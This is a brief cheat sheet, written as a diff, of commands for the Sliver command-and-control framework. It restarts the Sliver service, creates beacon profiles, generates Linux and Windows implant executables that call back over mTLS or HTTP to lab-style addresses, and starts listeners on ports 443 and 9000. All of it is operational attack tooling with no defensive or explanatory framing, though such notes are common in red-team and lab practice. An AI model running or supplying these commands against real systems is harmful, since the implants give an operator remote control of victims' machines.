@@ -1,0 +1,23 @@
+ # Reconfigure Sliver
+
+ sudo systemctl daemon-reload 
+ sudo systemctl start sliver.service
+ sudo service sliver start
+
+# Usage:
+# Create a profile
+profiles new beacon -a amd64 -e -f elf/exe -m "mtls://192.168.43.1:9000" mtls
+profiles generate mtls
+
+## Linux
+generate --mtls 10.10.10.136:9000 --os linux --save shell
+generate --http --os linux --format elf --output /tmp/sliver.elf
+
+## Windows
+generate --mtls --os windows --format exe --output sliver.exe
+
+## start a listener
+listener --http
+listener --mtls 0.0.0.0:443
+mtls --lhost 10.10.10.136 --lport 9000
+jobs
